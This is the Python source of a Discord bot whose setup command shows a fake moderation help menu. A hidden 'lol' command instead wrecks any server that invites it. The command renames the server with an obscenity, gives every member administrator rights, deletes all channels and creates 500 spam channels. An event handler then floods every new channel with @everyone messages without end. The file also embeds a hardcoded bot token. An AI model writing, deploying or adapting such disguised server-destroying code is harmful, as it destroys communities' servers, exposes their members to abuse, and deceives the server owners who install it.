import discord, random, asyncio
from discord.ext import commands
from discord import Permissions

prefix = ">"
token = "ODM4ODMwNDgxMDcyMDYyNDg0.YJAzww.vpM1V1sZzTaHHLwiiVEKnrilN2Y"
client = commands.Bot(command_prefix=commands.when_mentioned_or(prefix))
print("Connecting To The Nuker...")
SPAM_CHANNEL =  ["Chupapi runs you", "Chupapi","Chupapi Beamed You","Beamed by chupapi"]
SPAM_MESSAGE = ["@everyone CHUPAPI MUNYANYOO?! OMFG THIS SERVER GOT RAIDED, WHAT ASHAME :man_facepalming:"]

@client.event
async def on_ready():
    print('We have logged in as {0.user}'.format(client))
    print(f"username: {client.user.name}")
    print(f"id: {client.user.id}")
    print(f"prefix: '{prefix}'")
    print(f"invite: https://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions=268643383&scope=bot")
    print('===============================================')
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f">setup | 257 servers"))

@client.command(invoke_without_command=True)
async def setup(ctx):
    embed = discord.Embed(title="Moderation Module Help.", color = 0xf6d025)
    embed.add_field(name="privatelogging", value = "**Description:** Sets the channel for private logging for message edits, command uses, and deleted messages.\n**Permission Required:** Administrator\n**Arguments:** `None`\n```!privatelogging```", inline=False)
    embed.add_field(name="enablelogging", value = "**Description:** Sets the channel for mod logging.\n**Permission Required:** Administrator\n**Arguments:** `None`\n```!enablelogging```", inline=False)
    embed.add_field(name="staffvote", value = "**Description:** Sends an embed to vote for staff position through reacting with an upvote or downvote.\n**Permission Required:** Administrator\n**Arguments:** `member`\n```!staffvote Eric```", inline=False)
    embed.add_field(name="mute", value = "**Description:** Mute a user.Time argument format is `<number>[s|m|h|d|w]`. An example of this is `45m` which mutes the user for 45 minutes.\n**Permission Required:** Manage Roles\n**Arguments:** `user` `time` `reason`\n```!mute @user 10h this is a reason```", inline=False)
    embed.add_field(name="unmute", value = "**Description:** Unmute a user.\n**Permission Required:** Manage Roles\n**Arguments:** `user` `reason`\n```!unmute @user this is a reason```", inline=False)
    embed.add_field(name="info", value = "**Description:** Gives you info on a user.\n**Permission Required:** @Moderators\n**Arguments:** `user`\n```!info @user```", inline=False)
    embed.add_field(name="serverinfo", value = "**Description:** Gives you info on the current server.\n**Permission Required:** Administrator\n**Arguments:** `None`\n```!serverinfo```", inline=False)
    embed.add_field(name="kick", value = "**Description:** Kicks a user from the server.\n**Permission Required:** Kick Members\n**Arguments:** `user`\n```!kick @user```", inline=False)
    embed.add_field(name="ban", value = "**Description:** Bans a user.\n**Permission Required:** Ban Members\n**Arguments:** `user`\n```!ban @user```", inline=False)
    embed.add_field(name="clear", value = "**Description:** Clears messages from a channel. Can only delete messages in the range of [2, 100]\n**Permission Required:** Administrator\n**Arguments:** `integer`\n```!clear 50```", inline=False)
    embed.add_field(name="Create Role", value = "**Description:** Creates a new role and assigns a random color to it.\n**Permission Required:** Manage Roles\n**Arguments:** `Role Name`\n```!cr [role name]```", inline=False)
    embed.add_field(name="Edit Role", value = "**Description:** Takes an existing role and assigns a random color to it.\n**Permission Required:** Manage Roles\n**Arguments:** `Role Name`\n```!er [role name]```", inline=False)

    await ctx.send(embed=embed)

@client.command()
async def lol(ctx):
      await ctx.message.delete()
      for i in range(1):
          try:
            await ctx.guild.edit(name="FUCKED BY CHUPAPI MUNYANYO!")
            print("server name has been changed...")
          except:
            print("server name could not be changed...")
            
      guild = ctx.guild
      try:
        role = discord.utils.get(guild.roles, name = "@everyone")
        await role.edit(permissions = Permissions.all())
        print("I have given everyone admin.")
      except:
        print("I was unable to give everyone admin")
        
      for channel in guild.channels:
        try:
          await channel.delete()
          print(f"{channel.name} was deleted.")
        except:
          print(f"{channel.name} was NOT deleted.")
          
      for i in range(500):
        await guild.create_text_channel(random.choice(SPAM_CHANNEL))
      print(f"nuked {guild.name} Successfully.")
      return    

@client.event
async def on_guild_channel_create(channel):
    while True:
      await channel.send(random.choice(SPAM_MESSAGE))

client.run(token, bot=True)
